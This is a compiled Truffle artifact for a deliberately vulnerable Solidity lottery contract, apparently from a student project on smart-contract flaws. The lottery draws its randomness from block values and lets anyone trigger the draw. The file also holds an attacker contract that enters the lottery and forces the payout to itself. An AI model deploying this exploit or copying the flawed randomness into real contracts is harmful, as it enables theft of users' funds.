{
  "contractName": "LogicError",
  "abi": [
    {
      "inputs": [],
      "name": "lotteryAmt",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "participants",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "enterGame",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "chooseTheWinner",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610661806100206000396000f3fe60806040526004361061003f5760003560e01c8063218bd5771461004457806335c1d3491461004e5780634a5800d81461008b578063827c912d146100b6575b600080fd5b61004c6100c0565b005b34801561005a57600080fd5b506100756004803603810190610070919061032b565b61016f565b6040516100829190610399565b60405180910390f35b34801561009757600080fd5b506100a06101ae565b6040516100ad91906103c3565b60405180910390f35b6100be6101b4565b005b670de0b6b3a7640000341461010a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101019061043b565b60405180910390fd5b6000339080600181540180825580915050600190039060005260206000200160009091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b6000818154811061017f57600080fd5b906000526020600020016000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b60008080549050116101fb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101f2906104a7565b60405180910390fd5b6000808054905061020a6102b6565b61021491906104f6565b90506000818154811061022a57610229610527565b5b9060005260206000200160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561029a573d6000803e3d6000fd5b50600160008154809291906102ae90610585565b919050555050565b600048426000805490506040516020016102d2939291906105ee565b6040516020818303038152906040528051906020012060001c905090565b600080fd5b6000819050919050565b610308816102f5565b811461031357600080fd5b50565b600081359050610325816102ff565b92915050565b600060208284031215610341576103406102f0565b5b600061034f84828501610316565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061038382610358565b9050919050565b61039381610378565b82525050565b60006020820190506103ae600083018461038a565b92915050565b6103bd816102f5565b82525050565b60006020820190506103d860008301846103b4565b92915050565b600082825260208201905092915050565b7f57726f6e6720656e747279206665650000000000000000000000000000000000600082015250565b6000610425600f836103de565b9150610430826103ef565b602082019050919050565b6000602082019050818103600083015261045481610418565b9050919050565b7f4e6f207061727469636970616e747320696e207468652067616d650000000000600082015250565b6000610491601b836103de565b915061049c8261045b565b602082019050919050565b600060208201905081810360008301526104c081610484565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000610501826102f5565b915061050c836102f5565b92508261051c5761051b6104c7565b5b828206905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610590826102f5565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036105c2576105c1610556565b5b600182019050919050565b6000819050919050565b6105e86105e3826102f5565b6105cd565b82525050565b60006105fa82866105d7565b60208201915061060a82856105d7565b60208201915061061a82846105d7565b60208201915081905094935050505056fea26469706673582212209a768cfa56b8d4ea89767d9f20034381524bb6f9f9179c6b8211378d381838a364736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: UNLICENSED\r\n\r\npragma solidity ^0.8.19;\r\n\r\ncontract LogicError {\r\n\r\n    address payable[] public participants; //defining array for participants\r\n    uint public lotteryAmt;\r\n    function enterGame() public payable {\r\n        require(msg.value == 1 ether, \"Wrong entry fee\"); //participants must send exactly 1 Ether\r\n        participants.push(payable(msg.sender)); //if successful, add address to array\r\n    }\r\n\r\nfunction chooseTheWinner() public payable {\r\n    require(participants.length > 0, \"No participants in the game\"); //must be participants in array\r\n    \r\n    uint winnerIndex = random() % participants.length; //index generation for winner\r\n    participants[winnerIndex].transfer(address(this).balance); //transfer the contract balance to the selected winner\r\n    lotteryAmt++;\r\n}\r\n\r\nfunction random() private view returns (uint) {\r\n    return uint(keccak256(abi.encodePacked(block.basefee, block.timestamp, participants.length))); //generate random pseudo number with block timestamp and participants\r\n }\r\n}\r\n\r\ncontract LogicAttacker {\r\n    LogicError public gameError; //store vulnerable contract\r\n    constructor(address _logicErrorAddress) {  //to take vulnerable address as argument for deploying\r\n        gameError = LogicError(_logicErrorAddress);\r\n    }\r\n    function attack() public payable {\r\n        require(msg.value == 1 ether, \"Incorrect entry fee\");\r\n        gameError.enterGame{value: 1 ether}(); //calls the enterGame function of vulnerable contract with 1 Ether\r\n        gameError.chooseTheWinner(); //calls chooseTheWinner funcion\r\n    }\r\n    receive() external payable {\r\n        gameError.chooseTheWinner(); //fallback to call choseTheWinner to ensure attack success\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Individual Project\\Smart Contracts\\contracts\\LogicErrors.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-04-22T17:37:36.525Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}